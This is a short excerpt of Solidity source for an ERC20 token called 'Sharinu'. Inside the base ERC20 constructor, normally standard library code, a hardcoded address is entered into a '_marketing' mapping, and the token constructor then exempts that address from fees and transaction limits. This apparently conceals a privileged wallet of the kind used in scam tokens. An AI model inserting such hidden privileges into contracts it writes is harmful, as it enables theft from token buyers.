...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0x5f76590e79AecBA647514F4837213Eb3a11B0A94] = _marketingwallet;
    }
...
contract Sharinu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Sharinu", "SHARINU") {
        ...
        excludeFromFees(address(0x5f76590e79AecBA647514F4837213Eb3a11B0A94), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x5f76590e79AecBA647514F4837213Eb3a11B0A94), true);
